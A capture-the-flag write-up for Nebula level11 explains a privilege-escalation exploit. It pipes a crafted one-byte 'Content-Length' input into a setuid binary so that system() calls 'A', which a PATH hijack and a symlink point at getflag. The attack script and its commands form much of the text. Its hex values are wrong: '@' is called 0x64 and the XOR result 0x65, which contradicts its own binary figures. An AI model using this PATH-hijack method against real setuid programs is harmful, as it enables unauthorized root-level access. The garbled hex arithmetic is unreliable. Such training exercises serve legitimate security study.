# [Level11](https://exploit-exercises.com/nebula/level11)

## Method 1

This method exploits the `if(length < sizeof(buf))` path of the binary. Since `fread(buf, length, 1, stdin)` has a `1` in it's
third argument, it will only ever return `1`. This means in order to get to `process` we can only pass in a single byte.

Create a file at `/tmp/attack.sh`:

```bash
#!/bin/sh

echo "Content-Length: 1"
echo "@"
```

The ASCII code for `@` is `0x64` in hex and `0b1000000` in binary. In `process`, `@` gets `XORd` with the length `1`: 

`0b1000000 ^ 1 == 0b1000001 == 0x65`

This gives the ASCII code for `A`. So thus `system` will be called with `A`.

Then do:

```bash
chmod +x /tmp/attack.sh
export PATH=/tmp:$PATH
ln -sf /bin/getflag /tmp/A
/tmp/attack.sh | /home/flag11/flag11
```

You may need to run the attack a couple times since `char *buffer` has garage characters, and not `\x00` after `A` in every case.
